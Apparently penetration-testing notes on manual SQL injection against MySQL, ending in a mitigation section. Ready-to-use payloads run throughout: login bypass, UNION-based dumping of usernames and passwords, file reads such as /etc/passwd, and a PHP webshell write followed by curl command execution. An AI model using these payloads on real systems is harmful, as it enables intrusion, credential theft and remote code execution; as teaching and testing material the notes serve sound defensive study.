# SQL Injection — Manual Techniques

SQLi = user input inserted into a SQL query without sanitization → query logic altered. Targets relational DBs (MySQL, MSSQL, PostgreSQL, etc.). NoSQL injection is separate.

Discovery: inject `'` or `"` → syntax error → injectable. URL-encode as `%27` / `%22` for GET params.

PayloadsAllTheThings — auth bypass list: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## MySQL Basics — Quick Reference

Connect:

```bash
mysql -u <USER> -p -h <TARGET> -P 3306
```

Key SQL: `SHOW DATABASES;` / `USE <DB>;` / `SHOW TABLES;` / `DESCRIBE <TABLE>;` / `SELECT * FROM <TABLE>;`

Comments: `-- -` (note trailing space) or `#` (URL-encode as `%23` in browser). Everything after the comment is ignored.

Logical operators: `AND` / `OR` / `NOT` — symbol equivalents: `&&` / `||` / `!`. AND evaluates before OR (standard precedence).

LIKE wildcards: `%` = zero or more chars, `_` = exactly one char.

---

## Auth Bypass

SQLi discovery — inject a single quote in any field, check for SQL error. Common payloads:

OR bypass (when username is known):

```
admin'-- -
```

Final query becomes `SELECT * FROM logins WHERE username='admin'-- - ' AND password=...` — password check commented out.

OR bypass (unknown username, inject into both fields):

```
' OR '1'='1
```

```
' OR '1'='1'-- -
```

If query uses parentheses like `WHERE (username='X' AND id > 1)`, close the bracket:

```
admin')-- -
```

Auth bypass payloads work because OR short-circuits to TRUE. The comment (`-- -`) kills the rest of the query. Match the bracket structure or you get a syntax error.

---

## UNION Injection

UNION combines result sets — both SELECT statements must have the same column count and compatible types. Use numbers/NULL as junk data for unused columns.

Step 1 — find column count via ORDER BY (increment until error):

```
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 5-- -   ← error = 4 columns
```

Or use UNION with incrementing columns until no error:

```
' UNION SELECT 1,2,3-- -      ← error
' UNION SELECT 1,2,3,4-- -    ← success = 4 columns
```

Step 2 — identify which columns are printed (use `@@version` as a test):

```
' UNION SELECT 1,@@version,3,4-- -
```

Whichever number is replaced by the version string = a visible column. Use that position for all future data extraction.

---

## DB Enumeration via UNION

List databases:

```sql
' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

Current DB:

```sql
' UNION SELECT 1,database(),3,4-- -
```

List tables in a specific DB:

```sql
' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='<DBNAME>'-- -
```

List columns in a table:

```sql
' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='<TABLE>'-- -
```

Dump data (cross-DB with dot notation):

```sql
' UNION SELECT 1,username,password,4 FROM <DBNAME>.<TABLE>-- -
```

MySQL fingerprint — confirms MySQL/MariaDB (not MSSQL):

```sql
' UNION SELECT 1,@@version,3,4-- -        ← shows MySQL version
' UNION SELECT 1,POW(1,1),3,4-- -         ← returns 1
' UNION SELECT 1,SLEEP(5),3,4-- -         ← blind: 5s delay
```

---

## File Read via UNION

Requires: FILE privilege + `secure_file_priv` empty.

Check current user:

```sql
' UNION SELECT 1,user(),3,4-- -
```

Check super privilege:

```sql
' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user="root"-- -
```

Check `secure_file_priv` (empty = read/write anywhere, NULL = blocked):

```sql
' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
```

Read a file:

```sql
' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3,4-- -
```

Read web source (find webroot first — default Apache: `/var/www/html`):

```sql
' UNION SELECT 1,LOAD_FILE("/var/www/html/index.php"),3,4-- -
```

Webroot config paths: Apache → `/etc/apache2/apache2.conf`, Nginx → `/etc/nginx/nginx.conf`, IIS → `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`

---

## File Write → Webshell

Three requirements: FILE priv + `secure_file_priv` empty + write access to target dir.

Test write:

```sql
' UNION SELECT 1,'test',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

Write webshell (use empty strings for junk columns to avoid junk in file):

```sql
' UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -
```

Execute commands:

```bash
curl "http://<TARGET>/shell.php?0=id"
```

Use `FROM_BASE64("base64_data")` to write binary files or large PHP shells that would break with direct string injection.

`secure_file_priv` set to a directory or NULL blocks file write entirely. Check the variable before wasting time. MySQL defaults to `/var/lib/mysql-files` — not web-writable. MariaDB defaults to empty — usually writable.

---

## Mitigation — for Reporting

Parameterized queries / prepared statements → strongest fix. Input goes as bound parameter, never interpreted as SQL.

Input sanitization → `mysqli_real_escape_string()` escapes `'` and `"`. Not sufficient alone.

Input validation → regex whitelist (`[A-Za-z\s]+`) before the query runs.

Least-privilege DB users → web app account should only have SELECT on its own tables, no FILE privilege, no access to other DBs.

WAF → ModSecurity (open source), Cloudflare — blocks known SQLi patterns like `INFORMATION_SCHEMA`, `UNION SELECT`.